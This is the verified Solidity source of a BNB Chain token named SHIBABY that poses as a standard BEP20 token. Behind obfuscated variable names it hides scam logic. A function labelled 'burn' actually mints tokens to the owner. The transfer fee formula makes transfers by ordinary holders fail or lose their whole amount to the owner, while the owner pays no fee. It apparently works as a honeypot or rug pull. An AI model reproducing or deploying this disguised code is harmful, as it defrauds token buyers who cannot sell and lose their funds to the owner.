/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.1;
contract SHIBABY {
uint256 public  OPCfZa = 1000000000000000000;
address public  ysdOiO = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  IXUGhY = 100000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  rQmVHH = 100000000000000000000000;
uint256 public  ajTsgp = 10000000000000000000;
address public  CAlfLP = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  aXAIWD = 100000000000000000000;
address public  jJvxrc = address(0);
address public  lwJgOU = address(0);
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public owner;
string public  symbol = "SHIBABY";
string public  name = "SHIBABY";
mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  jdztgW = 10000000000000000;
uint256 private  wQeYew = 10000000000000;
address public  aczWax = address(0);
address public  JTxzjN = address(0);
uint256 public constant lBfPMF = 9999999999999999999999+1;
address private  BBWJdP = address(0);
uint256 public  GwdzUx = 100000000000000000000000;
uint256 public  TmyGYe = 10000000000000000000000000000;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "AmYBys");
require(to != address(0), "AmYBys");
require(amount <= balanceOf[from], "AmYBys");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* lBfPMF/wQeYew ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==BBWJdP){
wQeYew = 9999999999999999999999+1;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor ()  {
BBWJdP = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}